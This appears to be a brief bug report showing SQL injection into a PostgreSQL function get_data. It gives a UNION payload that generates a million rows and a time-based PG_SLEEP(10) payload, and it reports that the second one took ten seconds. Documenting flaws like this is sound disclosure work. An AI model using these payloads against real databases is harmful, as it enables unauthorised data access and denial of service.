select * from get_data('1'' 
union 
(select a1, cast(a1 as varchar), cast(a1 as integer) 
from 
(select generate_series a1 from generate_series (1,1000)) t1 
cross join 
(select * from generate_series (1,1000) t2) t3) -- ');

![image](https://user-images.githubusercontent.com/41470575/209439724-cdbcb889-c0ad-451a-9f5a-36654e85b0ba.png)

select * from get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(10)) -- ');

*was executing 10 seconds*

![image](https://user-images.githubusercontent.com/41470575/209441099-a98845c3-3c52-448e-ac2d-ff5f8ee8c986.png)
